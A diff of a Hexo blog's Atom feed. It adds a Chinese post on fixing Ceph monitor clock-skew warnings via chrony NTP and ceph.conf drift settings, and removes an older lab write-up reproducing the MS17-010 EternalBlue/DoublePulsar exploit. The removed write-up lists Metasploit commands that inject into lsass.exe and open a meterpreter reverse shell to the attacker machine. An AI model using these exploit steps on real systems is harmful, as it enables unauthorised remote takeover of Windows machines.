@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://t1ger.github.io/"/>
-  <updated>2017-06-06T09:38:00.092Z</updated>
+  <updated>2017-06-13T06:46:13.193Z</updated>
   <id>https://t1ger.github.io/</id>
   
   <author>
@@ -14,6 +14,66 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ceph-Monitor clock skew detected</title>
+    <link href="https://t1ger.github.io/2017/06/13/ceph-Monitor-clock-skew-detected/"/>
+    <id>https://t1ger.github.io/2017/06/13/ceph-Monitor-clock-skew-detected/</id>
+    <published>2017-06-13T07:00:09.000Z</published>
+    <updated>2017-06-13T06:46:13.193Z</updated>
+    
+    <content type="html"><![CDATA[<p>ceph异常警告:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_WARN</div><div class="line">            clock skew detected on mon.node2</div><div class="line">            Monitor clock skew detected </div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 46, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e218: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v1007: 256 pgs, 1 pools, 4 bytes data, 1 objects</div><div class="line">            345 MB used, 18377 GB / 18378 GB avail</div><div class="line">                 256 active+clean</div><div class="line">				 			 </div><div class="line">[root@admin ~]# ceph health detail</div><div class="line">HEALTH_WARN clock skew detected on mon.node2, mon.node3; Monitor clock skew detected </div><div class="line">mon.node2 addr 192.168.138.142:6789/0 clock skew 0.434161s &gt; max 0.05s (latency 0.00740637s)</div><div class="line">mon.node3 addr 192.168.138.143:6789/0 clock skew 0.687451s &gt; max 0.05s (latency 0.00722567s)</div></pre></td></tr></table></figure></p>
+<p>解决方法:</p>
+<ul>
+<li><p>方法一:配置ntp server<br>本来以为配置ntp server了,时间应该就一致了,原来ceph默认容忍的时间偏差不到1秒,随意只能用本地的ntp server了<br>下面来说说配置ntp server<br>chrony_server</p>
+<p>  1.install chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install chrony</div></pre></td></tr></table></figure>
+<p>  2.config chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# cat /etc/chrony.conf </div><div class="line"># These servers were defined in the installation:</div><div class="line">server 3.centos.pool.ntp.org iburst</div><div class="line">server 0.centos.pool.ntp.org iburst</div><div class="line">server cn.pool.ntp.org iburst</div><div class="line">server 1.centos.pool.ntp.org iburst</div><div class="line">server 2.centos.pool.ntp.org iburst</div><div class="line">....</div><div class="line">allow 192.168/16</div></pre></td></tr></table></figure>
+<p>  3.run chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl enable chronyd</div><div class="line">systemctl start chronyd</div></pre></td></tr></table></figure>
+<p>  4.timedatectl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">## 查看时间</div><div class="line">timedatectl</div><div class="line">## 开启ntp时间同步</div><div class="line">timedatectl set-ntp true</div></pre></td></tr></table></figure>
+<p>  5.chronyc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">## 查看ntp_servers状态</div><div class="line">chronyc sources -v</div><div class="line">## 查看ntp_sync状态</div><div class="line">chronyc sourcestats -v</div><div class="line">## 查看ntp_servers 是否在线</div><div class="line">chronyc activity -v</div><div class="line">## 查看ntp时间详细信息</div><div class="line">chronyc tracking -v</div></pre></td></tr></table></figure>
+<p>  chrony_client<br>  1.install chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install chrony</div></pre></td></tr></table></figure>
+<p>  2.config chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@node3 ~]# cat /etc/chrony.conf</div><div class="line"># These servers were defined in the installation:</div><div class="line">server 192.168.138.140 iburst</div></pre></td></tr></table></figure>
+<p>  3.run chrony</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl enable chronyd</div><div class="line">systemctl start chronyd</div></pre></td></tr></table></figure>
+<p>  4.timedatectl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">## 查看时间</div><div class="line">timedatectl</div><div class="line">## 开启ntp时间同步</div><div class="line">timedatectl set-ntp true</div></pre></td></tr></table></figure>
+<p>  5.chronyc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">## 查看ntp_servers状态</div><div class="line">chronyc sources -v</div><div class="line">## 查看ntp_sync状态</div><div class="line">chronyc sourcestats -v</div><div class="line">## 查看ntp_servers 是否在线</div><div class="line">chronyc activity -v</div><div class="line">## 查看ntp时间详细信息</div><div class="line">chronyc tracking -v</div><div class="line"></div><div class="line">[root@node3 ~]# chronyc tracking</div><div class="line">Reference ID    : 192.168.138.140 (192.168.138.140)</div><div class="line">Stratum         : 5</div><div class="line">Ref time (UTC)  : Tue Jun 13 05:52:48 2017</div><div class="line">System time     : 0.000494327 seconds fast of NTP time</div><div class="line">Last offset     : +0.000704829 seconds</div><div class="line">RMS offset      : 0.001765276 seconds</div><div class="line">Frequency       : 71.667 ppm slow</div><div class="line">Residual freq   : +0.269 ppm</div><div class="line">Skew            : 6.979 ppm</div><div class="line">Root delay      : 0.324675 seconds</div><div class="line">Root dispersion : 0.039305 seconds</div><div class="line">Update interval : 64.8 seconds</div><div class="line">Leap status     : Normal</div></pre></td></tr></table></figure>
+<p>  备注:chrony手动校时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chronyc -a makestep</div></pre></td></tr></table></figure>
+</li>
+<li><p>方法二:调整ceph参数避免<br>1.在admin结点上，修改ceph.conf，添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mon_clock_drift_allowed = 5</div><div class="line">mon_clock_drift_warn_backoff = 30</div></pre></td></tr></table></figure>
+<p>  详细参数参考<a href="http://docs.ceph.com/docs/hammer/rados/configuration/mon-config-ref/#clock" target="_blank" rel="external">这里</a></p>
+<p>  2.执行下面命令，node1等是monitor结点的名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ceph-deploy --overwrite-conf admin node1 node2 node3</div></pre></td></tr></table></figure>
+<p>  3.重启monitor</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">systemctl restart ceph-mon@node1</div><div class="line">systemctl restart ceph-mon@node2</div><div class="line">systemctl restart ceph-mon@node3</div></pre></td></tr></table></figure>
+<p>  4.验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_OK</div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 48, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e218: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v1007: 256 pgs, 1 pools, 4 bytes data, 1 objects</div><div class="line">            345 MB used, 18377 GB / 18378 GB avail</div><div class="line">                 256 active+clean</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>ref<br><a href="https://www.zfl9.com/chrony.html" target="_blank" rel="external">chrony时间同步</a><br><a href="https://dywang.csie.cyut.edu.tw/dywang/rhel7/node70.html" target="_blank" rel="external">chronyd 使用</a><br><a href="https://my.oschina.net/u/2475751/blog/704375" target="_blank" rel="external">ceph: HEALTH_WARN: Monitor clock skew detected</a></p>
+<hr>
+<p>您的鼓励是我写作最大的动力</p>
+<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。    </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;ceph异常警告:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div cl
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>ceph-crush algorithm(二)</title>
@@ -496,39 +556,6 @@ then the default (AUTO) value will be considered.
 &lt;li&gt;&lt;p&gt;全球多节点域名解析查询&lt;br&gt;&lt;a href=&quot;https://www.whatsmydns.net&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.whatsmydns.net&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>方程式-ms17-010复现</title>
-    <link href="https://t1ger.github.io/2017/05/16/%E6%96%B9%E7%A8%8B%E5%BC%8F-ms17-010%E5%A4%8D%E7%8E%B0/"/>
-    <id>https://t1ger.github.io/2017/05/16/方程式-ms17-010复现/</id>
-    <published>2017-05-16T14:28:33.000Z</published>
-    <updated>2017-05-16T14:01:15.340Z</updated>
-    
-    <content type="html"><![CDATA[<p>0x01 环境介绍:</p>
-<p>目标机win7 x86: 192.168.1.120</p>
-<p>控制机Kail: 192.168.1.99</p>
-<p>0x02 环境准备</p>
-<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
-<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
-<p>0x03 利用过程</p>
-<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
-<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
-<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
-<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;0x01 环境介绍:&lt;/p&gt;
-&lt;p&gt;目标机win7 x86: 192.168.1.120&lt;/p&gt;
-&lt;p&gt;控制机Kail: 192.168.1.99&lt;/p&gt;
-&lt;p&gt;0x02 环境准备&lt;/p&gt;
-&lt;p&gt;利用模块：&lt;a href=&quot;https://github.com/Eleven
     
     </summary>
     
